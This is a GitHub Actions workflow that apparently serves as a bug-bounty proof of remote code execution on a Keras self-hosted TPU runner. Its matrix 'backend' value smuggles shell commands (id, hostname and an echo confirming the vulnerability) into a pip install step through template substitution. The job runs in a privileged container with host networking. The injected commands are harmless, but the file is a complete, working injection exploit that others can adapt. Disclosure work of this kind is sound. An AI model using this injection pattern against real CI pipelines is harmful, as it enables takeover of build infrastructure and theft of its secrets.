name: Keras TPU Original Runner Proof
on:
  push:
    branches: [ master, vrp-rce-test ]
jobs:
  test-in-container:
    runs-on: linux-x86-ct6e-44-1tpu
    strategy:
      matrix:
        backend: ["jax; id; hostname; echo '--- VULNERABILITY CONFIRMED ---'; #"]
    container:
      image: python:3.11-slim
      options: --privileged --network host
    steps:
      - uses: actions/checkout@v6.0.2
      - name: Install Dependencies
        run: pip install --no-cache-dir -r requirements-${{ matrix.backend }}-tpu.txt
